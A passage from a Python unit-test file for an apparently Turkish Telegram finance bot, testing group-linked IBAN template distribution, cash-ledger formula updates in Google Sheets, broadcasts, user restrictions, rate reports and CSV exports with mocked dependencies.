        # 3. 2 grup bağlı: SACİD (İBAN'ı aktif) ve TİGER (İBAN atanmamış)
        mock_sheet = MagicMock()
        mock_sheet.title = "02.09.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf", "Tutar", "", "CYL1", "TR11", "VAKIF", "SACİD", "ARS1", "TR22", ""],
            ["1", "SACİD", "0", "0", "0", "0", "0", "", "", "", "", "CYL1", "TR11", "VAKIF", "SACİD", "ARS1", "TR22", ""]
        ]
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.get_sheet_values_fast = MagicMock(return_value=mock_sheet.get_all_values.return_value)

        bot.app_state["GRUP_BAGLANTILARI"] = {
            -100111: {"grup": "SACİD", "title": "Sacid Grubu"},
            -100222: {"grup": "TİGER", "title": "Tiger Grubu"}
        }
        bot.app_state["BAGLANTI_CACHE_TIME"] = bot.time.time()

        # Panel oluşturulmalı
        panel_metin, panel_kb = bot.toplu_duyuru_hazirla_paneli("/duyuru Banka hesaplarımız güncellenmiştir.", bot.KURUCU_ID)
        self.assertIn("TOPLU DUYURU KONTROL PANELİ", panel_metin)
        self.assertIn("Aktif İBAN'lı Gruplar (1):", panel_metin)
        self.assertIn("SACİD", panel_metin)
        self.assertIn("İBAN'sız Gruplar (1):", panel_metin)
        self.assertIn("TİGER", panel_metin)
        self.assertIsNotNone(panel_kb)
        
        # Callback button'dan draft_id'yi al
        btn_iban = panel_kb["inline_keyboard"][0][0]
        self.assertIn("Sadece İBAN'ı Aktif Gruplara", btn_iban["text"])
        draft_id = btn_iban["callback_data"].replace("duyuru_gonder_iban_", "")

        # 4. Özel tek grup seçim ekranı testi
        metin_ozel, kb_ozel = bot.duyuru_ozel_grup_secim_ekrani(draft_id)
        self.assertIn("ÖZEL TEK GRUP SEÇİM EKRANI", metin_ozel)
        self.assertTrue(len(kb_ozel["inline_keyboard"]) >= 2)

        # 5. Özel tek bir gruba gönderim callback testi (Sadece TİGER'a gönder)
        bot.telegramMesajGonder.reset_mock()
        rep_tek, _ = bot.toplu_duyuru_tek_grup_yayinla_callback(draft_id, -100222, bot.KURUCU_ID)
        self.assertIn("ÖZEL GRUP DUYURU RAPORU", rep_tek)
        self.assertIn("TİGER", rep_tek)

        # Sadece -100222'ye (TİGER) gitmeli, -100111'e (SACİD) GİTMEMELİ
        sent_chats = [call[0][0] for call in bot.telegramMesajGonder.call_args_list]
        self.assertEqual(sent_chats, [-100222])
        self.assertNotIn(-100111, sent_chats)

        # 6. Telegram Update Dispatch testi
        bot.telegramMesajGonder.reset_mock()
        update_broadcast = {
            "message": {
                "chat": {"id": 12345, "title": "Admin Chat"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/duyuru Acil toplantı saat 16:00"
            }
        }
        bot.process_telegram_update(update_broadcast)
        # Paneli admine göndermeli
        bot.telegramMesajGonder.assert_called()
        last_call = bot.telegramMesajGonder.call_args[0]
        self.assertIn("TOPLU DUYURU KONTROL PANELİ", last_call[1])

    def test_grup_senkronizasyonu(self):
        mock_sh = MagicMock()
        mock_daily = MagicMock()
        mock_daily.title = "02.09.2026"
        mock_daily.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa"],
            ["1", "SACİD YENİ", "0", "0"],
            ["2", "TİGER", "0", "0"],
            ["3", "BSM", "0", "0"]
        ]

        mock_baglanti = MagicMock()
        mock_baglanti.get_all_values.return_value = [
            ["Chat ID", "Grup Adı", "Telegram Grup Başlığı", "Ekleyen ID", "Tarih"],
            ["-100111", "sacid yeni", "Eski Başlık", "123", "02.09.2026"],
            ["-100222", "TİGER", "Tiger Grubu", "123", "02.09.2026"],
            ["-100333", "BSM", "ASLAN //// ÇEVRİM", "123", "02.09.2026"]
        ]

        def mock_ws_lookup(name):
            if name == "GRUP_BAGLANTILARI":
                return mock_baglanti
            return mock_daily

        mock_sh.worksheet.side_effect = mock_ws_lookup
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_daily)
        bot.get_sheet_values_fast = MagicMock(return_value=mock_daily.get_all_values.return_value)
        bot.telegram_api = MagicMock(return_value={"ok": True, "result": {"title": "Sacid Canlı Başlık"}})

        # Senkronize komutunu çalıştır
        rapor = bot.grup_senkronize_impl()
        self.assertIn("EXCEL & TELEGRAM GRUP SENKRONİZASYONU", rapor)
        self.assertIn("3 Adet", rapor)
        self.assertIn("SACİD YENİ", rapor)

        # app_state güncellenmiş olmalı
        self.assertIn(-100111, bot.app_state["GRUP_BAGLANTILARI"])
        self.assertEqual(bot.app_state["GRUP_BAGLANTILARI"][-100111]["grup"], "SACİD YENİ")

        # Telegram Update dispatch ile /senkron komutu
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True})
        update_sync = {
            "message": {
                "chat": {"id": 12345, "title": "Admin Chat"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/senkron"
            }
        }
        bot.process_telegram_update(update_sync)
        bot.telegramMesajGonder.assert_called()
        self.assertIn("EXCEL & TELEGRAM GRUP SENKRONİZASYONU", bot.telegramMesajGonder.call_args[0][1])

    def test_en_son_guncel_gunluk_sayfa_hedefi(self):
        mock_sh = MagicMock()

        ws_old = MagicMock()
        ws_old.title = "02.09.2026"
        ws_old.col_count = 18
        ws_old.row_count = 45

        ws_new = MagicMock()
        ws_new.title = "03.09.2026"
        ws_new.col_count = 18
        ws_new.row_count = 45

        rows = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf", "Tutar", "", "Hesap", "Şablon", "Banka", "Cari"],
            ["1", "SACİD", "0", "0", "0", "0", "0", "", "", "", "", "CYL 1", "TR11 22 33", "VAKIF", ""]
        ]
        ws_new.get_all_values.return_value = rows

        mock_sh.worksheets.return_value = [ws_old, ws_new]

        bot._cached_active_sheet = None
        bot._cached_active_sheet_time = 0
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_sheet_values_fast = MagicMock(return_value=rows)

        # 1. En son tarihli sayfa (03.09.2026) çözümlenmeli
        active_ws = bot.get_active_daily_sheet(mock_sh, force_refresh=True)
        self.assertEqual(active_ws.title, "03.09.2026")

        # 2. Bağlı grupta /sablon çağrıldığında İBAN tahsisi eski sayfaya değil yeni sayfaya (03.09.2026) yazılmalı
        bot.app_state["GRUP_BAGLANTILARI"] = {
            -100999: {"grup": "SACİD", "title": "Sacid VIP"}
        }
        bot.app_state["BAGLANTI_CACHE_TIME"] = bot.time.time()

        res, klavye = bot.iban_sablon_getir_impl("/sablon CYL 1", chat_id=-100999)
        self.assertIn("TR11 22 33", res)
        self.assertIn("SACİD", res)

        ws_new.update_cell.assert_called_once_with(2, 15, "SACİD")
        ws_old.update_cell.assert_not_called()

    def test_rapor_ilet_callback_routing(self):
        bot.app_state["RAPOR_TASLAKLARI"] = {
            "r_12345_678": {
                "grup": "MÜSLÜM",
                "metin": "Test Rapor Metni"
            }
        }
        bot.app_state["GRUP_BAGLANTILARI"] = {
            -100888: {"grup": "MÜSLÜM", "title": "Müslüm Grubu"}
        }
        bot.app_state["BAGLANTI_CACHE_TIME"] = bot.time.time()
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True})
        bot.telegram_api = MagicMock()

        update = {
            "callback_query": {
                "id": "cq_999",
                "data": "rapor_ilet_r_12345_678",
                "from": {"id": bot.KURUCU_ID},
                "message": {"chat": {"id": 12345}, "message_id": 999}
            }
        }
        bot.process_telegram_update(update)
        bot.telegramMesajGonder.assert_called_with(-100888, "Test Rapor Metni")

    def test_canli_kur_sorgula_includes_sol(self):
        def mock_http_get_json(url):
            if "ticker/24hr" in url:
                return [
                    {"symbol": "BTCUSDT", "lastPrice": "89500", "priceChangePercent": "2.45"},
                    {"symbol": "ETHUSDT", "lastPrice": "3100.50", "priceChangePercent": "-0.85"},
                    {"symbol": "BNBUSDT", "lastPrice": "580.20", "priceChangePercent": "1.12"},
                    {"symbol": "SOLUSDT", "lastPrice": "145.75", "priceChangePercent": "4.30"},
                    {"symbol": "XRPUSDT", "lastPrice": "0.5420", "priceChangePercent": "-0.15"},
                    {"symbol": "TRXUSDT", "lastPrice": "0.2350", "priceChangePercent": "0.80"},
                    {"symbol": "AVAXUSDT", "lastPrice": "28.40", "priceChangePercent": "3.10"},
                    {"symbol": "DOGEUSDT", "lastPrice": "0.1250", "priceChangePercent": "-1.05"}
                ]
            elif "exchangerate-api" in url:
                return {"rates": {"TRY": 48.50, "EUR": 0.90, "GBP": 0.78, "CHF": 0.85, "CAD": 1.35, "AUD": 1.50, "JPY": 150.0, "SAR": 3.75, "RUB": 90.0}}
            return {}

        mock_rates = {
            "binance": {"last": 48.35, "change": 0.25},
            "fiat": {"TRY": 48.50},
            "harem": {"usd": (48.08, 48.17), "eur": (55.60, 55.85), "gold": {"gram": 7350.0, "ons": 2850.0, "gumus": 85.20}}
        }

        with patch("bot.http_get_json", side_effect=mock_http_get_json), \
             patch("bot.fetch_all_market_rates_parallel", return_value=mock_rates):
            metin, klavye = bot.canliKurSorgula_impl()
            self.assertIn("CANLI PİYASA & DÜNYA KURLARI", metin)
            self.assertIn("BTC / USDT", metin)
            self.assertIn("ETH / USDT", metin)
            self.assertIn("BNB / USDT", metin)
            self.assertIn("SOL / USDT", metin)
            self.assertIn("XRP / USDT", metin)
            self.assertIn("TRX / USDT", metin)
            self.assertIn("AVAX / USDT", metin)
            self.assertIn("DOGE / USDT", metin)
            self.assertIn("🟢 +2.45%", metin)
            self.assertIn("🔴 -0.85%", metin)
            self.assertIn("Altın & Kıymetli Madenler", metin)
            self.assertIn("Kapalıçarşı Nakit & Arbitraj Makası", metin)
            self.assertIn("canli_kur_yenile", klavye["inline_keyboard"][0][0]["callback_data"])

    def test_sablon_kodlarini_coz(self):
        # 1. Aralık (Range) çözümü
        c1 = bot.sablon_kodlarini_coz("ARS 1-5")
        self.assertEqual(c1, ["ARS 1", "ARS 2", "ARS 3", "ARS 4", "ARS 5"])

        # 2. Çoklu kelimeli aralık (HSY EMLAK 3-6)
        c2 = bot.sablon_kodlarini_coz("HSY EMLAK 3-6")
        self.assertEqual(c2, ["HSY EMLAK 3", "HSY EMLAK 4", "HSY EMLAK 5", "HSY EMLAK 6"])

        # 3. Virgüllü liste (CYL 1, HSY 3, ARS 2)
        c3 = bot.sablon_kodlarini_coz("CYL 1, HSY 3, ARS 2")
        self.assertEqual(c3, ["CYL 1", "HSY 3", "ARS 2"])

        # 4. Karma (ARS 1-3, HSY 2-4)
        c4 = bot.sablon_kodlarini_coz("ARS 1-3, HSY 2-4")
        self.assertEqual(c4, ["ARS 1", "ARS 2", "ARS 3", "HSY 2", "HSY 3", "HSY 4"])

    def test_toplu_sablon_gonderimi(self):
        sablon_1 = "💳 IBAN: TR111111111111111111111111"
        sablon_2 = "💳 IBAN: TR222222222222222222222222"
        mock_sheet = MagicMock()
        mock_sheet.title = "30.08.2026"
        rows = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "", "", "", "Hesap 1", "Şablon 1", "Banka 1", "Cari 1", "Hesap 2", "Şablon 2", "Cari 2"],
            ["1", "SACİD", "0", "0", "0", "0", "0", "", "", "", "", "ARS EMLAK 1", sablon_1, "EMLK", "", "ARS EMLAK 2", sablon_2, ""]
        ]
        mock_sheet.get_all_values.return_value = rows
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.get_sheet_values_fast = MagicMock(return_value=rows)

        with patch("bot.telegramMesajGonder") as mock_send:
            res = bot.iban_sablon_getir_impl("/sablon ARS EMLAK 1-2", chat_id=-100777)
            self.assertIn("Toplu Şablon İletimi Tamamlandı", res)
            self.assertIn("2 adet", res)
            # İki ayrı mesaj atılmış olmalı
            self.assertEqual(mock_send.call_count, 2)
            call_1 = mock_send.call_args_list[0]
            call_2 = mock_send.call_args_list[1]
            self.assertIn("TR111111111111111111111111", call_1[0][1])
            self.assertIn("TR222222222222222222222222", call_2[0][1])

    def test_kisitli_kullanici_yetkileri(self):
        sacid_id = 8401305264
        # 1. Kısıtlı kullanıcı tespiti
        self.assertTrue(bot.kullanici_kisitli_mi(sacid_id))
        self.assertFalse(bot.kullanici_kisitli_mi(999999999))

        # 2. Yetkisiz mesaj komutlarının engellenmesi (/sablon, /devir, /kur)
        with patch("bot.yetkisiz_uyari_gonder") as mock_uyari:
            # /sablon engellenmeli
            update_sablon = {
                "message": {
                    "chat": {"id": -100123},
                    "from": {"id": sacid_id},
                    "text": "/sablon ARS 1"
                }
            }
            bot.process_telegram_update(update_sablon)
            mock_uyari.assert_called_once()
            self.assertIn("kısıtlı yetkiye sahiptir", mock_uyari.call_args[0][2])

        with patch("bot.yetkisiz_uyari_gonder") as mock_uyari:
            # /kasa SACİD 1500 (bakiye ekleme/yazma) engellenmeli
            update_kasa_yazma = {
                "message": {
                    "chat": {"id": -100123},
                    "from": {"id": sacid_id},
                    "text": "/kasa SACİD 1500"
                }
            }
            bot.process_telegram_update(update_kasa_yazma)
            mock_uyari.assert_called_once()
            self.assertIn("Kasaya bakiye/veri ekleme yetkiniz bulunmamaktadır", mock_uyari.call_args[0][2])

        # 3. Kısıtlı callback query (örn: İBAN silme/boşa çıkarma) engellenmesi
        with patch("bot.telegram_api") as mock_api:
            update_cb_sil = {
                "callback_query": {
                    "id": "cb_123",
                    "message": {"chat": {"id": -100123}},
                    "from": {"id": sacid_id},
                    "data": "grup_iban_sil_ARS 1_SACİD"
                }
            }
            bot.process_telegram_update(update_cb_sil)
            # answerCallbackQuery çağrılmalı ve show_alert verilerek engellenmeli
            calls = mock_api.call_args_list
            alert_found = any("Hesabınız kısıtlı yetkiye sahiptir" in str(c) for c in calls)
            self.assertTrue(alert_found)

        # 4. İzin verilen ekstra komutlar (/kur, /canlikur, /cevir 80000 usdt to try)
        with patch("bot.yetkisiz_uyari_gonder") as mock_uyari, patch("bot.islemi_analiz_bildirimiyle_yap") as mock_analiz:
            update_cevir = {
                "message": {
                    "chat": {"id": -100123},
                    "from": {"id": sacid_id},
                    "text": "/cevir 80000 usdt to try"
                }
            }
            bot.process_telegram_update(update_cevir)
            mock_uyari.assert_not_called()
            mock_analiz.assert_called_once()

        with patch("bot.yetkisiz_uyari_gonder") as mock_uyari, patch("bot.islemi_analiz_bildirimiyle_yap") as mock_analiz:
            update_kur = {
                "message": {
                    "chat": {"id": -100123},
                    "from": {"id": sacid_id},
                    "text": "/kur"
                }
            }
            bot.process_telegram_update(update_kur)
            mock_uyari.assert_not_called()
            mock_analiz.assert_called_once()

    def test_tum_tahsisli_ibanlar_and_temizleme(self):
        mock_values = [
            ["HESAP KODU", "ŞABLON", "", "DURUM", "", "HESAP KODU", "ŞABLON", "DURUM"],
            ["CYL Kuveyt 1", "💎 CYL KUYUMCULUK TR12 0006 2000 0001 2345 6789 01 💎", "", "SACİD", "", "SRGL Kuveyt 1", "💎 SRGL TR99 0006 2000 0001 2345 6789 02 💎", "THY"]
        ]
        with patch("bot.get_iban_values", return_value=mock_values):
            metin, klavye = bot.tum_tahsisli_ibanlar_raporu_uret()
            self.assertIn("TÜM TAHSİSLİ İBAN'LAR YÖNETİM PANELİ", metin)
            self.assertIn("CYL Kuveyt 1", metin)
            self.assertIn("SACİD", metin)
            self.assertIn("SRGL Kuveyt 1", metin)
            self.assertIn("THY", metin)

            btn_texts = [b["text"] for row in klavye["inline_keyboard"] for b in row]
            self.assertTrue(any("CYL Kuveyt 1" in t for t in btn_texts))
            self.assertTrue(any("TÜM TAHSİSLERİ SIFIRLA" in t for t in btn_texts))

        mock_sheet = MagicMock()
        mock_sheet.title = "İBANLAR"
        with patch("bot.get_spreadsheet") as mock_sp, patch("bot.get_iban_sheet", return_value=mock_sheet), patch("bot.get_sheet_values_fast", return_value=mock_values), patch("bot.update_sheet_matrix_memory") as mock_mem:
            res = bot.tum_tahsisli_ibanlari_temizle_impl()
            self.assertIn("TÜM İBAN TAHSİSLERİ BAŞARIYLA TEMİZLENDİ", res)
            self.assertEqual(mock_sheet.update_cell.call_count, 2)

    def test_ai_finans_analizi_uret(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "10.09.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Tutar"],
            ["1", "SACİD", "100.000", "500.000", "200.000", "0", "400.000", "", "Ofis Kirası", "25.000"],
            ["2", "TİGER", "50.000", "300.000", "150.000", "0", "200.000", "", "Personel", "15.000"],
            ["3", "THY", "0", "0", "0", "0", "0", "", "", ""]
        ]
        mock_sh = MagicMock()
        with patch("bot.get_spreadsheet", return_value=mock_sh), \
             patch("bot.get_active_daily_sheet", return_value=mock_sheet), \
             patch("bot.get_harem_dolar_kuru", return_value=(48.15, 48.25)), \
             patch("bot.get_harem_euro_kuru", return_value=(52.30, 52.45)):
            analiz = bot.ai_finans_analizi_uret()
            self.assertIn("CFO AI | AKILLI FİNANS VE YÖNETİCİ ÖZETİ", analiz)
            self.assertIn("SACİD", analiz)
            self.assertIn("800.000,00 ₺", analiz)
            self.assertIn("Ofis Kirası", analiz)
            self.assertIn("CFO AI STRATEJİK DEĞERLENDİRME", analiz)

    def test_anomali_analizi_uret(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "10.09.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Tutar"],
            ["1", "SACİD", "0", "50.000", "150.000", "0", "-100.000", "", "Yemek", "5.000"],
            ["2", "TİGER", "50.000", "100.000", "50.000", "0", "100.000", "", "", ""]
        ]
        mock_sh = MagicMock()
        with patch("bot.get_spreadsheet", return_value=mock_sh), \
             patch("bot.get_active_daily_sheet", return_value=mock_sheet):
            rapor = bot.anomali_analizi_uret()
            self.assertIn("FİNANSAL ANOMALİ & GÜVENLİK ANALİZİ", rapor)
            self.assertIn("SACİD", rapor)
            self.assertIn("Negatif Kalan Bakiye", rapor)

    def test_akilli_iban_dagit_impl(self):
        mock_values = [
            ["HESAP KODU", "ŞABLON", "", "DURUM", "", "HESAP KODU", "ŞABLON", "DURUM"],
            ["Kuv 1", "💎 Kuveyt TR111 💎", "", "SACİD", "", "Akb 1", "💎 Akbank TR222 💎", "BOŞTA"],
            ["Zir 1", "💎 Ziraat TR333 💎", "", "", "", "Vak 1", "💎 Vakıf TR444 💎", "BOSTA"]
        ]
        mock_sh = MagicMock()
        with patch("bot.get_spreadsheet", return_value=mock_sh), \
             patch("bot.get_iban_values", return_value=mock_values), \
             patch("bot.sync_iban_update") as mock_sync:
            mesaj, klavye = bot.akilli_iban_dagit_impl("/akilliiban TİGER")
            self.assertIn("AKILLI İBAN TAHSİS EDİLDİ", mesaj)
            self.assertIn("TİGER", mesaj)
            self.assertIn("Akb 1", mesaj)
            self.assertIn("ibanbosta_Akb 1", klavye["inline_keyboard"][0][0]["callback_data"])
            mock_sync.assert_called_with("Akb 1", "TİGER")

    def test_cari_locks_concurrency(self):
        lock1 = bot._get_cari_lock("SACİD")
        lock2 = bot._get_cari_lock("sacid")
        lock3 = bot._get_cari_lock("TİGER")
        self.assertIs(lock1, lock2)
        self.assertIsNot(lock1, lock3)

    def test_cari_ekstre_csv_uret_and_download(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "10.09.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "100000", "500000", "200000", "5000", "395000"],
            ["2", "TİGER", "50000", "150000", "50000", "0", "150000"]
        ]
        mock_sh = MagicMock()
        mock_sh.worksheets.return_value = [mock_sheet]
        with patch("bot.get_spreadsheet", return_value=mock_sh), \
             patch("bot.get_active_daily_sheet", return_value=mock_sheet):
            csv_bytes, fname, cap = bot.cari_ekstre_csv_uret("SACİD", 7)
            csv_text = csv_bytes.decode("utf-8-sig")
            self.assertIn("SACİD", csv_text)
            self.assertIn("395000", csv_text)
            self.assertTrue(fname.startswith("Ekstre_SACİD"))

            csv_bytes_all, fname_all, cap_all = bot.cari_ekstre_csv_uret("tumu")
            csv_all_text = csv_bytes_all.decode("utf-8-sig")
            self.assertIn("Gunluk_Finans", fname_all)
            self.assertIn("SACİD", csv_all_text)
            self.assertIn("TİGER", csv_all_text)

            bot.telegram_dosya_gonder = MagicMock(return_value={"ok": True})
            bot.csv_indir_komutu_impl(12345, "/indir SACİD")
            bot.telegram_dosya_gonder.assert_called_once()

    def test_rehber_includes_all_new_and_missing_commands(self):
        metin_rapor = bot.rehber_kategori_metni("rapor")
        self.assertIn("/ai", metin_rapor)
        self.assertIn("/anomali", metin_rapor)
        self.assertIn("/indir", metin_rapor)

        metin_kripto = bot.rehber_kategori_metni("kripto")
        self.assertIn("/akilliiban", metin_kripto)
        self.assertIn("/tahsisliibanlar", metin_kripto)
        self.assertIn("/synciban", metin_kripto)

        metin_admin = bot.rehber_kategori_metni("admin")
        self.assertIn("/id", metin_admin)
        self.assertIn("/panellink", metin_admin)

        metin_tumu = bot.rehber_kategori_metni("tumu")
        self.assertIn("/ai", metin_tumu)
        self.assertIn("/anomali", metin_tumu)
        self.assertIn("/akilliiban", metin_tumu)
        self.assertIn("/indir", metin_tumu)
        self.assertIn("/id", metin_tumu)

    def test_formula_number_formatting(self):
        self.assertEqual(bot.formul_sayi_formatla(1500000.0), "1500000")
        self.assertEqual(bot.formul_sayi_formatla(3744753.0), "3744753")
        self.assertEqual(bot.formul_sayi_formatla(1250.50), "1250.5")
        self.assertEqual(bot.formul_sayi_formatla(1250.25), "1250.25")
        self.assertEqual(bot.formul_sayi_formatla(0.0), "0")

    def test_formula_generation_chain(self):
        # 1. First transaction: empty cell
        f1 = bot.yeni_formul_olustur("", 1500000, 1)
        self.assertEqual(f1, "=1500000")

        # 2. Second transaction: append +2000000
        f2 = bot.yeni_formul_olustur(f1, 2000000, 1)
        self.assertEqual(f2, "=1500000+2000000")

        # 3. Third transaction: deduction -500000 (/kasasil)
        f3 = bot.yeni_formul_olustur(f2, 500000, -1)
        self.assertEqual(f3, "=1500000+2000000-500000")

        # 4. Fourth transaction: add 250000
        f4 = bot.yeni_formul_olustur(f3, 250000, 1)
        self.assertEqual(f4, "=1500000+2000000-500000+250000")

        # 5. Starting from static existing number
        f_static = bot.yeni_formul_olustur("1500000", 2000000, 1)
        self.assertEqual(f_static, "=1500000+2000000")

        # 6. Starting from formatted number
        f_fmt = bot.yeni_formul_olustur("1.500.000,00", 2000000, 1)
        self.assertEqual(f_fmt, "=1500000+2000000")

    def test_guvenli_sayi_formula_evaluation(self):
        self.assertAlmostEqual(bot.guvenliSayi("=1500000"), 1500000.0)
        self.assertAlmostEqual(bot.guvenliSayi("=1500000+2000000"), 3500000.0)
        self.assertAlmostEqual(bot.guvenliSayi("=1500000+2000000-500000"), 3000000.0)
        self.assertAlmostEqual(bot.guvenliSayi("=1500000+2000000-500000+250000"), 3250000.0)
        self.assertAlmostEqual(bot.guvenliSayi("=-500000"), -500000.0)

    def test_smart_group_and_amount_parser(self):
        bot.app_state["GRUP_BAGLANTILARI"] = {
            -100999: {"grup": "SACİD", "title": "Sacid Grubu"}
        }

        # In bound group with pure amount
        g, t = bot.parse_grup_ve_tutar_akilli(["/kasa", "3744753"], -100999)
        self.assertEqual(g, "SACİD")
        self.assertAlmostEqual(t, 3744753.0)

        # In bound group with amount with spaces (e.g. 3 744 753)
        g2, t2 = bot.parse_grup_ve_tutar_akilli(["/kasa", "3", "744", "753"], -100999)
        self.assertEqual(g2, "SACİD")
        self.assertAlmostEqual(t2, 3744753.0)

        # In bound group with /kasaekle
        g3, t3 = bot.parse_grup_ve_tutar_akilli(["/kasaekle", "3744753"], -100999)
        self.assertEqual(g3, "SACİD")
        self.assertAlmostEqual(t3, 3744753.0)

        # In bound group with /kasasil
        g4, t4 = bot.parse_grup_ve_tutar_akilli(["/kasasil", "500000"], -100999)
        self.assertEqual(g4, "SACİD")
        self.assertAlmostEqual(t4, 500000.0)

        # Explicit group in command (even in different bound group)
        g5, t5 = bot.parse_grup_ve_tutar_akilli(["/kasa", "TİGER", "500000"], -100999)
        self.assertEqual(g5, "TİGER")
        self.assertAlmostEqual(t5, 500000.0)

        # Unbound chat without group name should raise ValueError
        with self.assertRaises(ValueError):
            bot.parse_grup_ve_tutar_akilli(["/kasa", "3744753"], 12345)

    def test_hucreye_veri_yaz_formula_audit_and_group_detection(self):
        bot.app_state["GRUP_BAGLANTILARI"] = {
            -100888: {"grup": "SACİD", "title": "Sacid Finans"}
        }
        bot.app_state["MAX_TRANSACTION_LIMIT"] = 100000000.0

        mock_sheet = MagicMock()
        mock_sheet.title = "10.09.2026"
        data_rows = [
            ["Sıra", "Cari Adı", "Devir", "Kasa", "Ödenen", "Komisyon", "Kalan"],
            ["1", "SACİD", "0", "0", "0", "0", "0"],
        ]
        mock_sheet.get_all_values.return_value = data_rows

        mock_sh = MagicMock()
        mock_sh.worksheet.return_value = mock_sheet
        bot.get_spreadsheet = lambda force_refresh=False: mock_sh
        bot.get_active_daily_sheet = lambda sh, force_refresh=False: mock_sheet
        bot.get_sheet_values_fast = lambda ws, force_refresh=False, max_age_seconds=30.0: data_rows

        with bot._hucre_formul_hafizasi_lock:
            bot._hucre_formul_hafizasi.clear()

        # 1. Step 1: /kasa 1500000 in SACİD group (no group name typed)
        res1 = bot.hucreyeVeriYaz_impl("/kasa 1500000", 4, "Kasa Ekleme", 1, chat_id=-100888)
        self.assertIn("SACİD", res1)
        self.assertIn("1.500.000,00 ₺", res1)
        self.assertIn("Gruptan Otomatik Algılandı", res1)
        with bot._hucre_formul_hafizasi_lock:
            self.assertEqual(bot._hucre_formul_hafizasi.get(("10.09.2026", 2, 4)), "=1500000")

        # 2. Step 2: /kasa 2000000 in SACİD group
        res2 = bot.hucreyeVeriYaz_impl("/kasa 2000000", 4, "Kasa Ekleme", 1, chat_id=-100888)
        self.assertIn("SACİD", res2)
        with bot._hucre_formul_hafizasi_lock:
            self.assertEqual(bot._hucre_formul_hafizasi.get(("10.09.2026", 2, 4)), "=1500000+2000000")

        # 3. Step 3: /kasasil 500000 in SACİD group
        res3 = bot.hucreyeVeriYaz_impl("/kasasil 500000", 4, "Kasa Silme", -1, chat_id=-100888)
        self.assertIn("SACİD", res3)
        with bot._hucre_formul_hafizasi_lock:
            self.assertEqual(bot._hucre_formul_hafizasi.get(("10.09.2026", 2, 4)), "=1500000+2000000-500000")

        # 4. Step 4: /kasaekle 3 744 753 (with spaces in amount)
        res4 = bot.hucreyeVeriYaz_impl("/kasaekle 3 744 753", 4, "Kasa Ekleme", 1, chat_id=-100888)
        self.assertIn("SACİD", res4)
        self.assertIn("3.744.753,00 ₺", res4)
        with bot._hucre_formul_hafizasi_lock:
            self.assertEqual(bot._hucre_formul_hafizasi.get(("10.09.2026", 2, 4)), "=1500000+2000000-500000+3744753")

        # 5. Step 5: /odeme 250000 in SACİD group
        res5 = bot.hucreyeVeriYaz_impl("/odeme 250000", 5, "Ödenen Ekleme", 1, chat_id=-100888)
        self.assertIn("SACİD", res5)
        self.assertIn("250.000,00 ₺", res5)
        with bot._hucre_formul_hafizasi_lock:
            self.assertEqual(bot._hucre_formul_hafizasi.get(("10.09.2026", 2, 5)), "=250000")

        # 6. Step 6: Test undo of last action via gerial
        last_islem = bot.app_state["ISLEM_GECMISI"][-1]
        self.assertEqual(last_islem["grupAdi"], "SACİD")
        self.assertEqual(last_islem["sutun"], 5)
        # Undo manually like /gerial does:
        with bot._hucre_formul_hafizasi_lock:
            bot._hucre_formul_hafizasi[(last_islem["sayfa"], last_islem["satir"], last_islem["sutun"])] = last_islem["eskiDeger"]
        self.assertEqual(bot._hucre_formul_hafizasi.get(("10.09.2026", 2, 5)), "0")

    def test_process_telegram_update_smart_routing(self):
        bot.app_state["GRUP_BAGLANTILARI"] = {
            -100777: {"grup": "SACİD", "title": "Sacid Operasyon"}
        }
        bot.app_state["BAGLANTI_CACHE_TIME"] = bot.time.time()
        bot.app_state["MAX_TRANSACTION_LIMIT"] = 100000000.0

        mock_sheet = MagicMock()
        mock_sheet.title = "10.09.2026"
        data_rows = [
            ["Sıra", "Cari Adı", "Devir", "Kasa", "Ödenen", "Komisyon", "Kalan"],
            ["1", "SACİD", "0", "0", "0", "0", "0"],
        ]
        mock_sheet.get_all_values.return_value = data_rows

        mock_sh = MagicMock()
        mock_sh.worksheet.return_value = mock_sheet
        bot.get_spreadsheet = lambda force_refresh=False: mock_sh
        bot.get_active_daily_sheet = lambda sh, force_refresh=False: mock_sheet
        bot.get_sheet_values_fast = lambda ws, force_refresh=False, max_age_seconds=30.0: data_rows

        sent_messages = []
        bot.telegramMesajGonder = lambda chat_id, text, reply_markup=None, kapat_butonu_ekle=True: sent_messages.append((chat_id, text))

        # 1. Test /kasa 3744753 in group
        upd1 = {
            "message": {
                "chat": {"id": -100777, "title": "Sacid Operasyon"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/kasa 3744753"
            }
        }
        bot.process_telegram_update(upd1)
        self.assertTrue(any("Kasa Ekleme Başarılı" in m[1] and "SACİD" in m[1] for m in sent_messages))

        # 2. Test /kasaekle 500000 in group
        sent_messages.clear()
        upd2 = {
            "message": {
                "chat": {"id": -100777, "title": "Sacid Operasyon"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/kasaekle 500000"
            }
        }
        bot.process_telegram_update(upd2)
        self.assertTrue(any("Kasa Ekleme Başarılı" in m[1] and "SACİD" in m[1] for m in sent_messages))

